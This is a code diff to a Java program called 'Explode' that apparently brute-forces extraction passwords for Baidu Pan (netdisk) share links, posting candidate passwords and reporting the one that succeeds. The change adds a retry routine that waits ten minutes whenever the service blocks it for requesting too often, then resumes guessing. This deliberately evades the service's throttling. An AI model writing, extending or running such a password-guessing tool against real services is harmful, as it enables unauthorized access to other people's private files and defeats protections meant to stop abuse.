@@ -3,9 +3,11 @@ package com.magic;
 import com.alibaba.fastjson.JSONObject;
 import org.springframework.http.HttpEntity;
 import org.springframework.http.HttpHeaders;
+import org.springframework.http.HttpStatus;
 import org.springframework.http.MediaType;
 import org.springframework.util.LinkedMultiValueMap;
 import org.springframework.util.MultiValueMap;
+import org.springframework.web.client.HttpClientErrorException;
 import org.springframework.web.client.RestTemplate;
 
 import java.util.ArrayList;
@@ -13,7 +15,6 @@ import java.util.Arrays;
 import java.util.List;
 
 public class Explode {
-
     //参考官方文档 https://pan.baidu.com/union/doc/Yksmyl2v0
     public static void main(String[] args) {
 
@@ -68,7 +69,11 @@ public class Explode {
                             e.printStackTrace();
                         }
                         HttpEntity<MultiValueMap<String, Object>> request = new HttpEntity<MultiValueMap<String, Object>>(paramMap, headers);
-                        String result = restTemplate.postForObject(url, request, String.class);
+                        String result = postRecursion(restTemplate, url, request);
+                        if (result.startsWith("Error")) {
+                            System.out.println(result);
+                            break;
+                        }
                         JSONObject obj = JSONObject.parseObject(result);
                         if (obj.getIntValue("errno") == 0) {
                             System.out.println("success " + pwd);
@@ -87,6 +92,35 @@ public class Explode {
             j = 0;
         }
 
+    }
+
+    /**
+     * 递归调用，访问太频繁被404之后。等待10分钟后继续
+     *
+     * @param restTemplate
+     * @param url
+     * @param request
+     * @return
+     */
+    public static String postRecursion(RestTemplate restTemplate, String url, HttpEntity<MultiValueMap<String, Object>> request) {
+        String result;
+        try {
+            result = restTemplate.postForObject(url, request, String.class);
+        } catch (HttpClientErrorException e) {
+            if (e.getStatusCode() == HttpStatus.NOT_FOUND) {
+                try {
+                    // 10分钟后继续
+                    Thread.sleep(1000 * 60 * 10L);
+                    result = postRecursion(restTemplate, url, request);
+                } catch (InterruptedException ie) {
+                    return "Error sleep interrupted";//
+                }
+            } else {
+                e.printStackTrace();
+                return "Error http";
+            }
+        }
+        return result;
     }
 
 
